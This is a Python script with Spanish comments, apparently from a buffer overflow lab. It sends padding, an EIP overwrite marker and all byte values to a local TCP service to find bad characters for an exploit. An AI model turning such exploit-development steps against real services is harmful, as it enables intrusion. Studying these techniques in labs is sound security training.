import socket

def generate_badchars(exclude=[]):
    """
    Genera una secuencia de bytes de 0x00 a 0xFF excluyendo caracteres específicos.
    """
    return bytes([x for x in range(256) if x not in exclude])

def send_payload(ip, port, offset, exclude=[]):
    """
    Envía un payload con los caracteres malos y retorna la respuesta del servidor.
    """
    bad_chars = generate_badchars(exclude)
    
    buffer = b"A" * offset
    eip = b"B" * 4
    payload = buffer + eip + bad_chars

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.send(payload)
        s.close()
        print(f"[+] Payload enviado con {len(bad_chars)} posibles bad chars.")
    except Exception as e:
        print(f"[-] Error al enviar el payload: {e}")

# Configuración
TARGET_IP = "127.0.0.1"
TARGET_PORT = 8888
OFFSET = 1052

# Primer intento sin excluir caracteres
send_payload(TARGET_IP, TARGET_PORT, OFFSET)

